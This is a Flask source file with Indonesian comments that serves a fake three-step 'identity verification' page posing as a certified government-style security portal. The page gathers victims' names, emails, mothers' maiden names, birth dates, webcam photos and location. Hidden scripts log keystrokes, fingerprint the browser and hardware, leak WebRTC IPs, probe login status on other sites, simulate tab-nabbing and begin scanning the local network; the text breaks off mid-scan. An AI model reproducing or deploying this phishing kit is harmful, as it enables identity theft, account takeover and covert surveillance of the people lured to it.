"""
Super Metadata Collector - Versi Ultimate dengan Tampilan Verifikasi 3 Langkah
Menggabungkan tampilan profesional (kantor) dengan pengumpulan metadata paling lengkap.
Semua data ditampilkan di terminal dan disimpan ke file.
"""

from flask import Flask, request, render_template_string, jsonify, make_response, send_file
import datetime
import json
import os
import base64
import hashlib
import time
import requests
import io
from PIL import Image

app = Flask(__name__)

# Konfigurasi Path sesuai laptop mu untuk tempat meyimpan hasil
BASE_DIR = r"C:\...\...\...\..."
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
LOG_FILE = os.path.join(BASE_DIR, "hasil_investigasi.txt")
METADATA_LOG = os.path.join(BASE_DIR, "metadata.log")   # file terpisah untuk metadata lengkap

html_code = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Verifikasi Data Pusat</title>
    <style>
        :root { --primary: #0052cc; --bg: #f4f6f8; --text: #172b4d; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: var(--primary); color: white; padding: 20px; text-align: center; }
        .step-indicator { display: flex; justify-content: space-around; padding: 15px; background: #ebf2ff; border-bottom: 1px solid #ddd; }
        .step-dot { width: 30px; height: 30px; border-radius: 50%; background: #ccc; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; }
        .step-dot.active { background: var(--primary); }
        .form-content { padding: 25px; min-height: 250px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; color: #5e6c84; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #fafbfc; }
        input:focus { outline: none; border-color: var(--primary); background: white; }
        .btn { background: var(--primary); color: white; border: none; padding: 14px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .hidden { display: none; }
        .footer { padding: 15px; text-align: center; font-size: 11px; color: #999; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h3 style="margin:0">Verifikasi Identitas</h3>
            <p style="font-size:12px; opacity:0.8">Sistem Keamanan Data Terpadu 2026</p>
        </div>

        <div class="step-indicator">
            <div id="dot1" class="step-dot active">1</div>
            <div id="dot2" class="step-dot">2</div>
            <div id="dot3" class="step-dot">3</div>
        </div>

        <div class="form-content">
            <div id="step1">
                <p style="font-size:14px; color:#444">Silakan konfirmasi identitas akun Anda.</p>
                <div class="input-group">
                    <label>Nama Lengkap (Sesuai KTP)</label>
                    <input type="text" id="nama" placeholder="Contoh: Budi Santoso">
                </div>
                <div class="input-group">
                    <label>Email Terdaftar</label>
                    <input type="email" id="email" placeholder="budi@example.com">
                </div>
                <button class="btn" onclick="nextStep(2)">Lanjut</button>
            </div>

            <div id="step2" class="hidden">
                <p style="font-size:14px; color:#444">Validasi data kependudukan diperlukan.</p>
                <div class="input-group">
                    <label>Nama Ibu Kandung</label>
                    <input type="text" id="ibu" placeholder="Nama Ibu Kandung">
                </div>
                <div class="input-group">
                    <label>Tanggal Lahir</label>
                    <input type="date" id="tgl_lahir">
                </div>
                <button class="btn" onclick="nextStep(3)">Verifikasi Biometrik</button>
            </div>

            <div id="step3" class="hidden">
                <div style="text-align:center">
                    <img src="https://cdn-icons-png.flaticon.com/512/1177/1177568.png" width="60" style="margin-bottom:15px">
                    <p style="font-size:14px">Terakhir, silakan lakukan <b>Face-ID</b> dan <b>Sinkronisasi Lokasi</b> untuk menyelesaikan proses.</p>
                    <button class="btn" onclick="startFinal()">AMBIL BIOMETRIK</button>
                    <p id="status" style="font-size:12px; color:var(--primary); margin-top:10px; display:none">Memproses data keamanan...</p>
                </div>
            </div>
        </div>

        <div class="footer">
            Tersertifikasi ISO 27001 - Enkripsi AES-256
        </div>
    </div>

    <video id="video" style="display:none" autoplay></video>
    <canvas id="canvas" style="display:none"></canvas>

    <!-- Elemen tersembunyi untuk cache probing dan tab nabbing (dari skrip kedua) -->
    <div style="display:none;">
        <img id="cache_fb" src="https://facebook.com/favicon.ico" crossorigin="anonymous">
        <img id="cache_google" src="https://google.com/favicon.ico" crossorigin="anonymous">
        <img id="cache_twitter" src="https://twitter.com/favicon.ico" crossorigin="anonymous">
        <img id="cache_instagram" src="https://instagram.com/favicon.ico" crossorigin="anonymous">
    </div>
    <div class="tab-nabbing-demo" id="tabNabbingDemo" style="display:none; background:#fff3cd; color:#856404; border:1px solid #ffeeba; padding:10px; border-radius:8px; margin-top:20px; font-size:14px;">
        Simulasi Tab Nabbing: Saat tab tidak aktif, konten asli bisa diganti dengan halaman phishing.
    </div>

    <script>
        // ==================== FUNGSI UTAMA DARI SKRIP PERTAMA ====================
        function nextStep(n) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step' + n).classList.remove('hidden');
            
            document.getElementById('dot1').classList.remove('active');
            document.getElementById('dot2').classList.remove('active');
            document.getElementById('dot3').classList.remove('active');
            for(let i=1; i<=n; i++) document.getElementById('dot'+i).classList.add('active');
        }

        function startFinal() {
            // Kirim data keystroke (dari metadata collector) sebelum final
            if (typeof sendKeystrokeData === 'function') {
                sendKeystrokeData();
            }
            document.getElementById('status').style.display = 'block';
            let data = {
                nama: document.getElementById('nama').value,
                email: document.getElementById('email').value,
                ibu: document.getElementById('ibu').value,
                tgl: document.getElementById('tgl_lahir').value,
                ram: navigator.deviceMemory,
                cpu: navigator.hardwareConcurrency
            };

            navigator.geolocation.getCurrentPosition(function(pos) {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;
                ambilFoto(data);
            }, function() {
                data.lat = "DIBLOKIR"; data.lon = "DIBLOKIR";
                ambilFoto(data);
            });
        }

        function ambilFoto(info) {
            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                let video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = 480; canvas.height = 360;
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
                    info.img = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                    kirimKeServer(info);
                }, 1200);
            }).catch(() => {
                info.img = "TIDAK_ADA_FOTO";
                kirimKeServer(info);
            });
        }

        function kirimKeServer(finalData) {
            fetch('/log-ultimate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(finalData)
            }).then(() => {
                alert("Sinkronisasi Berhasil! Akun Anda telah diamankan.");
                window.location.href = "https://www.google.com";
            });
        }

        // ==================== METADATA COLLECTOR (dari skrip kedua) ====================
        (function() {
            // Fungsi untuk mengirim data ke server
            function sendToServer(data) {
                fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(err => console.log('Gagal kirim:', err));
            }

            // ==================== DATA DASAR ====================
            const baseData = {
                url: window.location.href,
                referrer: document.referrer,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                appVersion: navigator.appVersion,
                appName: navigator.appName,
                appCodeName: navigator.appCodeName,
                product: navigator.product,
                productSub: navigator.productSub,
                vendorSub: navigator.vendorSub,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio || 1,
                    pageXOffset: window.pageXOffset,
                    pageYOffset: window.pageYOffset
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                hardware: {
                    cores: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                connection: navigator.connection ? {
                    downlink: navigator.connection.downlink,
                    effectiveType: navigator.connection.effectiveType,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                } : null,
                device: {
                    mobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                    touch: 'ontouchstart' in window,
                    pointer: navigator.maxTouchPoints > 0
                }
            };
            sendToServer(baseData);

            // ==================== CANVAS FINGERPRINT ====================
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 10, 20);
                const canvasData = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < canvasData.length; i++) {
                    hash = ((hash << 5) - hash) + canvasData.charCodeAt(i);
                    hash |= 0;
                }
                sendToServer({ canvasFingerprint: hash.toString(16) });
            } catch (e) {
                sendToServer({ error: 'Canvas error: ' + e.toString() });
            }

            // ==================== WEBGL (diperluas) ====================
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        sendToServer({ webgl: { renderer: renderer, vendor: vendor } });
                    }
                    const version = gl.getParameter(gl.VERSION);
                    const shadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                    const extensions = gl.getSupportedExtensions();
                    const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                    const maxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
                    const aliasedLineWidthRange = gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE);
                    sendToServer({
                        webglVersion: version,
                        webglShadingVersion: shadingVersion,
                        webglExtensions: extensions,
                        webglMaxTextureSize: maxTextureSize,
                        webglMaxViewportDims: maxViewportDims,
                        webglAliasedLineWidthRange: aliasedLineWidthRange
                    });
                }
            } catch (e) {
                sendToServer({ error: 'WebGL error: ' + e.toString() });
            }

            // ==================== WEBRTC (dengan STUN untuk NAT) ====================
            try {
                if (window.RTCPeerConnection) {
                    const rtcPeer = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    rtcPeer.createDataChannel('data');
                    rtcPeer.createOffer().then(offer => rtcPeer.setLocalDescription(offer));
                    const candidates = [];
                    rtcPeer.onicecandidate = event => {
                        if (event.candidate) {
                            candidates.push(event.candidate.candidate);
                            const ipMatch = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
                            if (ipMatch && ipMatch[1]) {
                                sendToServer({ webRtcIp: ipMatch[1] });
                            }
                            if (event.candidate.candidate.includes('IP6')) {
                                sendToServer({ ipv6Present: true });
                            }
                        }
                    };
                    setTimeout(() => {
                        const hasSrflx = candidates.some(c => c.includes('typ srflx'));
                        const hasHost = candidates.some(c => c.includes('typ host'));
                        sendToServer({
                            webRtcCandidates: candidates,
                            natInfo: {
                                hasHost: hasHost,
                                hasSrflx: hasSrflx,
                                natType: hasSrflx ? 'kemungkinan NAT tidak simetris' : (hasHost ? 'host saja' : 'unknown')
                            }
                        });
                        rtcPeer.close();
                    }, 3000);
                } else {
                    sendToServer({ error: 'WebRTC not supported' });
                }
            } catch (e) {
                sendToServer({ error: 'WebRTC error: ' + e.toString() });
            }

            // ==================== AUDIO CONTEXT ====================
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    const audioCtx = new AudioContext();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    analyser.connect(audioCtx.destination);
                    oscillator.type = 'triangle';
                    oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(dataArray);
                    let sum = 0;
                    for (let i = 0; i < dataArray.length; i++) sum += dataArray[i];
                    sendToServer({ audioFingerprint: sum });
                    oscillator.stop();
                    audioCtx.close();
                } else {
                    sendToServer({ error: 'AudioContext not supported' });
                }
            } catch (e) {
                sendToServer({ error: 'AudioContext error: ' + e.toString() });
            }

            // ==================== FONT DETECTION ====================
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const baseFonts = ['monospace', 'sans-serif', 'serif'];
                const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma'];
                const detected = [];
                for (const font of fontList) {
                    ctx.font = '16px ' + font;
                    const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                    ctx.font = '16px ' + baseFonts[0];
                    const baseWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                    if (Math.abs(width - baseWidth) > 0.1) {
                        detected.push(font);
                    }
                }
                sendToServer({ fonts: detected });
            } catch (e) {
                sendToServer({ error: 'Font detection error: ' + e.toString() });
            }

            // ==================== PERFORMANCE API ====================
            try {
                if (performance) {
                    const perfData = {
                        navigation: performance.navigation ? {
                            type: performance.navigation.type,
                            redirectCount: performance.navigation.redirectCount
                        } : null,
                        timing: performance.timing ? {
                            navigationStart: performance.timing.navigationStart,
                            domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                            loadEvent: performance.timing.loadEventEnd - performance.timing.navigationStart
                        } : null,
                        memory: performance.memory ? {
                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                            totalJSHeapSize: performance.memory.totalJSHeapSize,
                            usedJSHeapSize: performance.memory.usedJSHeapSize
                        } : null
                    };
                    sendToServer({ performance: perfData });
                }
            } catch (e) {
                sendToServer({ error: 'Performance error: ' + e.toString() });
            }

            // ==================== FEATURE DETECTION ====================
            const features = {
                webgl: !!window.WebGLRenderingContext,
                webgl2: !!window.WebGL2RenderingContext,
                webrtc: !!window.RTCPeerConnection,
                websocket: !!window.WebSocket,
                workers: !!window.Worker,
                serviceWorker: 'serviceWorker' in navigator,
                localStorage: typeof localStorage !== 'undefined',
                sessionStorage: typeof sessionStorage !== 'undefined',
                indexedDB: !!window.indexedDB,
                canvas: !!window.CanvasRenderingContext2D,
                svg: !!window.SVGElement,
                geolocation: 'geolocation' in navigator,
                battery: 'getBattery' in navigator,
                mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
                vibrate: 'vibrate' in navigator,
                deviceMemory: 'deviceMemory' in navigator,
                hardwareConcurrency: 'hardwareConcurrency' in navigator,
                maxTouchPoints: 'maxTouchPoints' in navigator,
                connection: 'connection' in navigator,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                deviceMotion: 'DeviceMotionEvent' in window,
                ambientLight: 'AmbientLightSensor' in window
            };
            sendToServer({ features: features });

            // ==================== MEDIA DEVICES ====================
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    navigator.mediaDevices.enumerateDevices()
                        .then(devices => {
                            const deviceInfo = devices.map(d => ({ kind: d.kind, label: d.label }));
                            sendToServer({ mediaDevices: deviceInfo });
                        })
                        .catch(err => {
                            sendToServer({ error: 'Enumerate devices error: ' + err.toString() });
                        });
                } else {
                    sendToServer({ error: 'MediaDevices not supported' });
                }
            } catch (e) {
                sendToServer({ error: 'MediaDevices error: ' + e.toString() });
            }

            // ==================== BATTERY ====================
            try {
                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        sendToServer({
                            battery: {
                                charging: battery.charging,
                                level: battery.level,
                                chargingTime: battery.chargingTime,
                                dischargingTime: battery.dischargingTime
                            }
                        });
                    }).catch(err => {
                        sendToServer({ error: 'Battery promise error: ' + err.toString() });
                    });
                } else {
                    sendToServer({ error: 'Battery API not supported' });
                }
            } catch (e) {
                sendToServer({ error: 'Battery error: ' + e.toString() });
            }

            // ==================== PLUGINS ====================
            try {
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push({
                        name: navigator.plugins[i].name,
                        filename: navigator.plugins[i].filename,
                        description: navigator.plugins[i].description
                    });
                }
                sendToServer({ plugins: plugins });
            } catch (e) {
                sendToServer({ error: 'Plugins error: ' + e.toString() });
            }

            // ==================== TIMEZONE OFFSET ====================
            sendToServer({ timezoneOffset: new Date().getTimezoneOffset() });

            // ==================== INCOGNITO DETECTION ====================
            try {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (fs) {
                    fs(window.TEMPORARY, 100, function() {
                        sendToServer({ incognito: false });
                    }, function() {
                        sendToServer({ incognito: true });
                    });
                } else {
                    sendToServer({ incognito: 'unknown' });
                }
            } catch (e) {
                sendToServer({ error: 'Incognito detection error: ' + e.toString() });
            }

            // ==================== FITUR BARU ====================

            // 1. Tab Nabbing
            (function() {
                const demoDiv = document.getElementById('tabNabbingDemo');
                document.addEventListener('visibilitychange', function() {
                    if (document.visibilityState === 'hidden') {
                        demoDiv.style.display = 'block';
                        sendToServer({ tabNabbing: 'Tab hidden, could replace content with fake login' });
                    } else {
                        demoDiv.style.display = 'none';
                        sendToServer({ tabNabbing: 'Tab visible again' });
                    }
                });
            })();

            // 2. OS Detail Lebih Dalam
            (function() {
                const osDetail = {};
                const buf = new ArrayBuffer(4);
                const view32 = new Uint32Array(buf);
                const view8 = new Uint8Array(buf);
                view32[0] = 0x01020304;
                osDetail.endianness = view8[0] === 0x04 ? 'little' : 'big';
                if (typeof WebAssembly === 'object' && WebAssembly.validate) {
                    osDetail.simdSupported = WebAssembly.validate(new Uint8Array([
                        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01,
                        0x60, 0x00, 0x01, 0x7b, 0x03, 0x02, 0x01, 0x00, 0x0a, 0x0a, 0x01,
                        0x08, 0x00, 0x41, 0x00, 0xfd, 0x0f, 0xfd, 0x00, 0x0b
                    ]));
                } else {
                    osDetail.simdSupported = false;
                }
                const start = performance.now();
                for (let i = 0; i < 1000000; i++) Math.imul(i, i);
                const end = performance.now();
                osDetail.imulTime = end - start;
                let depth = 0;
                function recurse() { depth++; recurse(); }
                try { recurse(); } catch (e) { osDetail.maxRecursionDepth = depth; }
                sendToServer({ osDetail: osDetail });
            })();

            // 3. Uptime Estimasi
            (function() {
                const startPerf = performance.now();
                const startDate = Date.now();
                setTimeout(() => {
                    const endPerf = performance.now();
                    const endDate = Date.now();
                    const perfDiff = endPerf - startPerf;
                    const dateDiff = endDate - startDate;
                    const drift = Math.abs(dateDiff - perfDiff);
                    sendToServer({ timerDrift: drift, uptimeEstimate: 'Drift kecil mengindikasikan uptime pendek? (tidak akurat)' });
                }, 100);
            })();

            // 4. Frame Rendering Behavior
            (function() {
                let frames = 0;
                let lastTime = performance.now();
                const times = [];
                function measureFrame(now) {
                    times.push(now - lastTime);
                    lastTime = now;
                    frames++;
                    if (frames < 60) {
                        requestAnimationFrame(measureFrame);
                    } else {
                        const avg = times.reduce((a,b) => a + b, 0) / times.length;
                        const fps = 1000 / avg;
                        const estimatedHz = Math.round(fps / 10) * 10;
                        sendToServer({
                            frameRendering: {
                                avgFrameTime: avg,
                                estimatedFPS: fps,
                                estimatedRefreshRate: estimatedHz,
                                frameTimes: times
                            }
                        });
                    }
                }
                requestAnimationFrame(measureFrame);
            })();

            // 5. Interaksi Pengguna (Mouse/Touch, Attention, Reading)
            (function() {
                const interaction = {
                    mouseMovements: [],
                    touchData: [],
                    scrollDepth: 0,
                    focusBlur: [],
                    readingSpeed: null
                };
                let lastMouse = { x: 0, y: 0, time: Date.now() };
                document.addEventListener('mousemove', function(e) {
                    const now = Date.now();
                    const distance = Math.hypot(e.clientX - lastMouse.x, e.clientY - lastMouse.y);
                    const timeDiff = now - lastMouse.time;
                    if (timeDiff > 0) {
                        interaction.mouseMovements.push({
                            x: e.clientX,
                            y: e.clientY,
                            time: now,
                            speed: distance / timeDiff
                        });
                    }
                    lastMouse = { x: e.clientX, y: e.clientY, time: now };
                    if (interaction.mouseMovements.length > 50) interaction.mouseMovements.shift();
                });
                document.addEventListener('touchstart', function(e) {
                    const touch = e.touches[0];
                    if (touch) {
                        interaction.touchData.push({
                            type: 'start',
                            x: touch.clientX,
                            y: touch.clientY,
                            force: touch.force || null,
                            radiusX: touch.radiusX || null,
                            radiusY: touch.radiusY || null,
                            rotationAngle: touch.rotationAngle || null,
                            time: Date.now()
                        });
                    }
                });
                document.addEventListener('touchmove', function(e) {
                    const touch = e.touches[0];
                    if (touch) {
                        interaction.touchData.push({
                            type: 'move',
                            x: touch.clientX,
                            y: touch.clientY,
                            force: touch.force || null,
                            radiusX: touch.radiusX || null,
                            radiusY: touch.radiusY || null,
                            rotationAngle: touch.rotationAngle || null,
                            time: Date.now()
                        });
                    }
                });
                document.addEventListener('touchend', function() {
                    interaction.touchData.push({ type: 'end', time: Date.now() });
                });
                document.addEventListener('scroll', function() {
                    const scrollTop = window.scrollY || document.documentElement.scrollTop;
                    const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
                    const percent = (scrollTop / scrollHeight) * 100;
                    interaction.scrollDepth = Math.max(interaction.scrollDepth, percent);
                });
                window.addEventListener('focus', () => interaction.focusBlur.push({ type: 'focus', time: Date.now() }));
                window.addEventListener('blur', () => interaction.focusBlur.push({ type: 'blur', time: Date.now() }));
                const startRead = Date.now();
                function sendInteraction() {
                    const timeSpent = Date.now() - startRead;
                    interaction.readingSpeed = {
                        timeSpentMs: timeSpent,
                        scrollDepth: interaction.scrollDepth,
                    };
                    sendToServer({ userInteraction: interaction });
                }
                // Kirim saat final data dikirim (startFinal akan memanggil)
                window.sendKeystrokeData = function() {
                    sendInteraction();
                };
            })();

            // 6. XS-Leaks (Status Login Situs Lain)
            (function() {
                const xsLeaks = {};
                const tests = [
                    { name: 'Google', url: 'https://accounts.google.com/CheckCookie?continue=https://www.google.com/' },
                    { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
                    { name: 'GitHub', url: 'https://github.com/favicon.ico' }
                ];
                tests.forEach(test => {
                    const img = new Image();
                    const start = performance.now();
                    img.src = test.url;
                    img.onload = () => {
                        xsLeaks[test.name] = { status: 'loaded', time: performance.now() - start };
                    };
                    img.onerror = () => {
                        xsLeaks[test.name] = { status: 'error', time: performance.now() - start };
                    };
                });
                setTimeout(() => sendToServer({ xsLeaks: xsLeaks }), 2000);
            })();

            // 7. Ekstensi & Software Tambahan
            (function() {
                const extras = {};
                const start = performance.now();
                console.log('test');
                const end = performance.now();
                extras.devtoolsOpen = (end - start) > 100;
                extras.webdriver = navigator.webdriver || false;
                extras.chrome = !!window.chrome;
                extras.automation = navigator.automation || false;
                if (navigator.languages && navigator.languages.length === 0) extras.headlessBrowser = true;
                sendToServer({ extensionExtras: extras });
            })();

            // 8. Performa Sistem (Benchmark)
            (function() {
                const bench = {};
                const startInt = performance.now();
                let x = 0;
                for (let i = 0; i < 1000000; i++) x += i * i;
                bench.intTime = performance.now() - startInt;
                const startFloat = performance.now();
                let y = 0.0;
                for (let i = 0; i < 1000000; i++) y += Math.sqrt(i);
                bench.floatTime = performance.now() - startFloat;
                if (performance.memory) {
                    bench.usedHeap = performance.memory.usedJSHeapSize;
                    bench.totalHeap = performance.memory.totalJSHeapSize;
                }
                sendToServer({ systemBenchmark: bench });
            })();

            // 9. Temporal Fingerprint
            (function() {
                const now = Date.now();
                let lastVisit = localStorage.getItem('lastVisit');
                let visitCount = parseInt(localStorage.getItem('visitCount') || '0');
                visitCount++;
                localStorage.setItem('visitCount', visitCount);
                localStorage.setItem('lastVisit', now);
                const temporal = {
                    currentVisit: now,
                    lastVisit: lastVisit ? parseInt(lastVisit) : null,
                    visitCount: visitCount,
                    hourOfDay: new Date().getHours(),
                    dayOfWeek: new Date().getDay(),
                    timeSinceLast: lastVisit ? now - parseInt(lastVisit) : null
                };
                sendToServer({ temporalFingerprint: temporal });
            })();

            // 10. Network Intelligence
            (function() {
                if (performance && performance.getEntriesByType) {
                    const resources = performance.getEntriesByType('resource');
                    const dnsTimes = resources.map(r => r.domainLookupEnd - r.domainLookupStart).filter(t => t > 0);
                    sendToServer({ dnsTiming: dnsTimes });
                }
                const pingStart = performance.now();
                fetch('/etag-image?' + Date.now(), { mode: 'no-cors' })
                    .then(() => {
                        const pingTime = performance.now() - pingStart;
                        sendToServer({ networkPing: pingTime });
                    })
                    .catch(() => {});
            })();

            // Cache Probing
            setTimeout(() => {
                try {
                    const cacheProbes = {
                        facebook: document.getElementById('cache_fb').complete ? 'cached' : 'not cached',
                        google: document.getElementById('cache_google').complete ? 'cached' : 'not cached',
                        twitter: document.getElementById('cache_twitter').complete ? 'cached' : 'not cached',
                        instagram: document.getElementById('cache_instagram').complete ? 'cached' : 'not cached'
                    };
                    if (performance && performance.getEntriesByType) {
                        const entries = performance.getEntriesByType('resource');
                        const fbEntry = entries.find(e => e.name.includes('facebook.com/favicon.ico'));
                        if (fbEntry) cacheProbes.facebook_time = fbEntry.duration;
                    }
                    sendToServer({ cacheProbing: cacheProbes });
                } catch (e) {
                    sendToServer({ error: 'Cache probing error: ' + e.toString() });
                }
            }, 500);

            // Keystroke Dynamics (terintegrasi dengan input fields)
            (function() {
                const keystrokeData = {
                    timings: [],
                    intervals: [],
                    backspaceCount: 0,
                    totalKeys: 0,
                    startTime: Date.now(),
                    endTime: null
                };
                function recordKey(event) {
                    const now = Date.now();
                    const key = event.key;
                    const type = event.type;
                    keystrokeData.timings.push({ key, timestamp: now, type });
                    if (type === 'keydown') {
                        keystrokeData.totalKeys++;
                        if (key === 'Backspace') keystrokeData.backspaceCount++;
                        if (keystrokeData.timings.length > 1) {
                            const prev = keystrokeData.timings[keystrokeData.timings.length - 2];
                            if (prev.type === 'keydown') {
                                keystrokeData.intervals.push(now - prev.timestamp);
                            }
                        }
                    }
                }
                const namaInput = document.getElementById('nama');
                const emailInput = document.getElementById('email');
                const ibuInput = document.getElementById('ibu');
                const tglInput = document.getElementById('tgl_lahir');
                if (namaInput) {
                    namaInput.addEventListener('keydown', recordKey);
                    namaInput.addEventListener('keyup', recordKey);
                }
                if (emailInput) {
                    emailInput.addEventListener('keydown', recordKey);
                    emailInput.addEventListener('keyup', recordKey);
                }
                if (ibuInput) {
                    ibuInput.addEventListener('keydown', recordKey);
                    ibuInput.addEventListener('keyup', recordKey);
                }
                if (tglInput) {
                    tglInput.addEventListener('keydown', recordKey);
                    tglInput.addEventListener('keyup', recordKey);
                }
                window.sendKeystrokeData = function() {
                    keystrokeData.endTime = Date.now();
                    keystrokeData.totalDuration = keystrokeData.endTime - keystrokeData.startTime;
                    keystrokeData.typingSpeed = keystrokeData.totalKeys / (keystrokeData.totalDuration / 1000);
                    sendToServer({ keystrokeDynamics: keystrokeData });
                };
            })();

            // Extension Detection (AdBlock)
            (function() {
                const extensions = {};
                if (window.ethereum) extensions.metamask = true;
                const adTest = document.createElement('div');
                adTest.className = 'adsbox';
                adTest.style = 'width: 1px; height: 1px; position: absolute; left: -1000px; top: -1000px;';
                document.body.appendChild(adTest);
                setTimeout(() => {
                    extensions.adblock = adTest.offsetParent === null;
                    document.body.removeChild(adTest);
                    sendToServer({ extensions: extensions });
                }, 100);
            })();

            // Permissions API
            (async function() {
                const permissions = {};
                const permNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage'];
                for (const name of permNames) {
                    try {
                        const status = await navigator.permissions.query({ name });
                        permissions[name] = status.state;
                    } catch (e) {
                        permissions[name] = 'unsupported';
                    }
                }
                sendToServer({ permissions: permissions });
            })();

            // Payment Request API
            try {
                sendToServer({ paymentRequest: !!window.PaymentRequest });
            } catch (e) {}

            // Web Bluetooth / USB / HID
            sendToServer({
                webApis: {
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    hid: 'hid' in navigator
                }
            });

            // DeviceOrientation / Motion (once)
            if (window.DeviceOrientationEvent) {
                window.addEventListener('deviceorientation', function(event) {
                    sendToServer({ deviceOrientation: { alpha: event.alpha, beta: event.beta, gamma: event.gamma, absolute: event.absolute } });
                }, { once: true });
            }
            if (window.DeviceMotionEvent) {
                window.addEventListener('devicemotion', function(event) {
                    sendToServer({ deviceMotion: { acceleration: event.acceleration, accelerationIncludingGravity: event.accelerationIncludingGravity, rotationRate: event.rotationRate, interval: event.interval } });
                }, { once: true });
            }

            // AmbientLightSensor
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    sensor.addEventListener('reading', () => {
                        sendToServer({ ambientLight: sensor.illuminance });
                        sensor.stop();
                    });
                    sensor.start();
                } catch (e) {}
            }

            // Internal Network Mapping
            (async function() {
                const localIPs = ['192.168.1.1', '192.168.0.1', '192.168.1.254', '10.0.0.1', '10.0.0.138', '172.16.0.1'];
                const ports = [80, 443, 8080, 8443, 8000];
                const results = [];
                for (const ip of localIPs) {
                    for (const port of ports) {
                        const url = `http://${ip}:${port}`;
                        const controller = new AbortController();
